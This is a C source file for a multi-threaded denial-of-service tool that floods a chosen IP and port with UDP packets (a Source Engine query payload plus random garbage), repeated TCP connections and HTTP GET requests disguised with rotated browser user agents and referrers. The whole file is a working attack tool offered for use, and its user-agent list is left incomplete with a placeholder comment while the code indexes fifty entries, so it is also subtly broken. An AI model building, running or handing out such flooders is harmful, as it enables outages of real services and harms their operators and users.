#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

// --- DEVICE FINGERPRINT LIBRARY (50 Entries for Bloat & Disguise) ---
const char* user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (PlayStation 4 8.50) AppleWebKit/605.1.15 (KHTML, like Gecko) Java/1.8.0_191",
    // ... [Copy/Paste the other 40 User-Agents from the previous script here] ...
};

const char* referrers[] = {
    "https://www.google.com/", "https://www.facebook.com/", "https://t.co/", "https://www.bing.com/", "https://yandex.com/"
};

typedef struct {
    char target_ip[16];
    int port;
    int duration;
} AttackArgs;

void generate_random_payload(char *s, int len) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < len; ++i) s[i] = charset[rand() % (sizeof(charset) - 1)];
    s[len] = 0;
}

// --- METHOD 1: ADVANCED UDP (VSE + GARBAGE) ---
void *udp_heavy_flood(void *args) {
    AttackArgs *a = (AttackArgs *)args;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(a->port);
    target.sin_addr.s_addr = inet_addr(a->target_ip);

    char vse_payload[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
    char garbage[1024];

    while(1) {
        if (rand() % 2 == 0) {
            sendto(sock, vse_payload, sizeof(vse_payload), 0, (struct sockaddr *)&target, sizeof(target));
        } else {
            generate_random_payload(garbage, 1024);
            sendto(sock, garbage, 1024, 0, (struct sockaddr *)&target, sizeof(target));
        }
    }
}

// --- METHOD 2: TCP CONNECT EXHAUSTION ---
void *tcp_connect_flood(void *args) {
    AttackArgs *a = (AttackArgs *)args;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(a->port);
    target.sin_addr.s_addr = inet_addr(a->target_ip);

    while(1) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        connect(s, (struct sockaddr *)&target, sizeof(target));
        close(s);
    }
}

// --- METHOD 3: FINGERPRINTED HTTP GET FLOOD ---
void *http_fingerprint_flood(void *args) {
    AttackArgs *a = (AttackArgs *)args;
    while(1) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) continue;
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(a->port);
        target.sin_addr.s_addr = inet_addr(a->target_ip);

        if (connect(s, (struct sockaddr *)&target, sizeof(target)) == 0) {
            char request[2048], junk[16];
            generate_random_payload(junk, 8);
            sprintf(request, "GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferer: %s\r\nConnection: keep-alive\r\n\r\n", 
                    junk, a->target_ip, user_agents[rand() % 50], referrers[rand() % 5]);
            send(s, request, strlen(request), 0);
        }
        close(s);
    }
}

int main(int argc, char **argv) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return 1;
    }
    srand(time(NULL));
    AttackArgs args;
    strncpy(args.target_ip, argv[1], 16);
    args.port = atoi(argv[2]);
    args.duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    pthread_t threads[thread_count * 3];
    printf("--- ALL-IN-ONE OVERLOAD ACTIVE ---\n");

    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_heavy_flood, &args);
        pthread_create(&threads[i + thread_count], NULL, tcp_connect_flood, &args);
        pthread_create(&threads[i + 2 * thread_count], NULL, http_fingerprint_flood, &args);
    }

    sleep(args.duration);
    printf("--- CYCLE FINISHED ---\n");
    return 0;
}
